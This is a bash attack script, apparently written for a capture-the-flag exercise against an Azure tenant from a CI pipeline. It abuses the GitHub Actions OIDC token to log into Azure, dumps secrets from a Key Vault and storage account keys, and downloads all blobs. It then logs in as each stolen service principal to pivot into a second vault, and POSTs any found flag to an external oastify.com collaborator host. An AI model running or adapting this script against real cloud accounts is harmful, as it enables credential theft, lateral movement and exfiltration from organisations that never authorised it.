#!/usr/bin/env bash
# Tebamoto Logistics - step 5, run 4.
# Fixes run 3: cache all source-vault secrets WHILE still federated (changing identity
# loses read access to the source vault), and stop swallowing stderr on blob listing.
#
# Read-only, scoped to rg-tbl-platform-prod-sea. No secret value is ever echoed:
# the public Actions log gets names/lengths/match only, and only the flag goes OOB.
set -uo pipefail

COLLAB="qd7hc0dfk4496dnnphwewgj2dtjo778imqpse.oastify.com"
RG="rg-tbl-platform-prod-sea"
SRC_VAULT="kv-tbl-prod-x3euoz"
TGT_VAULT="kv-tbl-sec-x3euoz"
FLAGRE='DF26\{[^}]+\}'
FOUND=""
WORK=$(mktemp -d)

say() { echo "[*] $*"; }
note() { M=$(grep -oE "$FLAGRE" <<<"$1" | head -1); [ -n "$M" ] && FOUND="$M"; echo "${M:+MATCH}${M:--}"; }

federate() {
  local t
  t=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value // empty')
  [ -z "$t" ] && return 1
  az logout >/dev/null 2>&1
  az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
    --federated-token "$t" --allow-no-subscriptions >/dev/null 2>&1
}

federate && say "federated login OK" || { say "federated login FAILED"; exit 1; }

# ------------------------------------------------- 1. cache principals up front
say "=== caching principals from $SRC_VAULT (values never printed) ==="
N=0
for S in $(az keyvault secret list --vault-name "$SRC_VAULT" --query "[].name" -o tsv 2>/dev/null); do
  az keyvault secret show --vault-name "$SRC_VAULT" --name "$S" --query value -o tsv >"$WORK/$S" 2>/dev/null
  if [ -s "$WORK/$S" ]; then
    say "  cached $S (len=$(wc -c <"$WORK/$S"), keys=$(jq -r 'keys|join(",")' <"$WORK/$S" 2>/dev/null))"
    N=$((N+1))
  else
    say "  $S unreadable"
  fi
done
say "cached $N principal(s)"

# ------------------------------------------------- 2. storage, both auth modes
say "=== storage blobs ==="
for A in $(az storage account list -g "$RG" --query "[].name" -o tsv 2>/dev/null); do
  K=$(az storage account keys list -n "$A" -g "$RG" --query "[0].value" -o tsv 2>/dev/null)
  if [ ${#K} -ge 40 ]; then AUTH=(--account-key "$K"); MODE=key; else AUTH=(--auth-mode login); MODE=aad; fi
  CL=$(az storage container list --account-name "$A" "${AUTH[@]}" --query "[].name" -o tsv 2>&1)
  say "  account=$A auth=$MODE containers=$(tr '\n' ' ' <<<"$CL" | head -c 120)"
  grep -qiE 'error|denied|forbidden' <<<"$CL" && continue
  for C in $CL; do
    BL=$(az storage blob list --account-name "$A" "${AUTH[@]}" -c "$C" --query "[].name" -o tsv 2>&1)
    if grep -qiE 'error|denied|forbidden' <<<"$BL"; then
      say "    $C -> list failed: $(head -c 140 <<<"$BL" | tr -d '\n')"
      continue
    fi
    for B in $BL; do
      D=$(az storage blob download --account-name "$A" "${AUTH[@]}" -c "$C" -n "$B" \
          --file /dev/stdout -o none 2>/dev/null)
      say "    blob=$C/$B len=${#D} flag=$(note "$D")"
    done
  done
done

# ------------------------------------------------- 3. pivot through each principal
say "=== pivot -> $TGT_VAULT ==="
for F in "$WORK"/*; do
  [ -s "$F" ] || continue
  S=$(basename "$F")
  CID=$(jq -r '.clientId // .appId // .client_id // empty' <"$F" 2>/dev/null)
  SEC=$(jq -r '.clientSecret // .password // .client_secret // empty' <"$F" 2>/dev/null)
  TEN=$(jq -r '.tenantId // .tenant // .tenant_id // empty' <"$F" 2>/dev/null)
  [ -z "$CID" ] && { say "  $S -> no clientId field"; continue; }

  az logout >/dev/null 2>&1
  if ! az login --service-principal -u "$CID" -p "$SEC" -t "${TEN:-$AZURE_TENANT_ID}" \
        --allow-no-subscriptions >/dev/null 2>&1; then
    say "  $S (${CID:0:8}…) -> login failed"; continue
  fi
  LIST=$(az keyvault secret list --vault-name "$TGT_VAULT" --query "[].name" -o tsv 2>&1)
  if grep -qiE 'forbidden|not authorized|error' <<<"$LIST"; then
    say "  $S (${CID:0:8}…) -> denied"; continue
  fi
  say "  $S (${CID:0:8}…) -> UNLOCKED"
  for T in $LIST; do
    V=$(az keyvault secret show --vault-name "$TGT_VAULT" --name "$T" --query value -o tsv 2>/dev/null)
    say "      secret=$T len=${#V} flag=$(note "$V")"
  done
  [ -n "$FOUND" ] && break
done

# ------------------------------------------------- 4. report
rm -rf "$WORK"
if [ -n "$FOUND" ]; then
  say "FLAG FOUND (${#FOUND} chars) - OOB only"
  curl -sS -m 25 -X POST --data-binary "$FOUND" -H 'Content-Type: text/plain' \
    "http://${COLLAB}/flag" -o /dev/null -w '    exfil http=%{http_code}\n' 2>&1
else
  say "no match"
fi
az logout >/dev/null 2>&1; say "done"
